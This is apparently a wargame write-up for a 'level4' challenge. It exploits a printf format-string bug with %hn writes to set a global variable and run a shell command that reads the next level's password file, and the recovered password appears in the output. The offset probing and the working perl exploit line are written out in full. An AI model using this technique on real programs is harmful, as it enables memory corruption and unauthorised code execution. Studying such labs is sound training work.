The process is very close to level3:

```c
number = 0;  // 0x8049810
{
...

fgets(arg, 512, stdin);

printf(arg)

if (number == 0x1025544) {
	// we win :)
	system("/bin/cat /home/user/level5/.pass");
}
...
```
> view the `Ressources/main.asm` and `source` files for the disasembly part

The goal is to write the value `0x1025544` in the address of `number` (`0x8049810`).

---

Let's determine the offset at which the first printf arg begin
```
> for i in {0..100}; do echo "Index: $i" && echo "****%$i\$x" | ./level4 ; done | grep -B1 2a2a
Index: 12
```

This mean that we can do
```bash
> echo "ABCD %12\$x" | ./level4
ABCD 44434241

# 41 A,  42 B,  43 C,  44 D

# ABCD 44 43 42 41
#      D  C  B  A
```

---

We can use the `%n` like in the level3 but `0x1025544` is a big number,
so we are gonna split it in half

`0x0102`, `0x5544` // splited in 16bits

We need to write number in ascending order

`0x5544 > 0x0102` so we write `0x0102` before

`0x0102`:
- 0x0102 - 8 = 250  // 8 is the two address length
- 256 % 16 = 0
- 256 - 250 = 6  // we append 6 at the end

`0x5544`:
- 0x5544 - 0x0102 = 21570
- 21584 % 16 = 0
- 21584 - 21570 = 14  // we append 14 at the end

---
exploit

```bash
> (perl -e 'print "\x12\x98\x04\x08" . "\x10\x98\x04\x08" . "%250x%12\$hn" . "%21570x%13\$hn" . "A"x(6+14)'; cat) | ./level4
bffff704AAAAAAAAAAAAAAAAAAAA
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
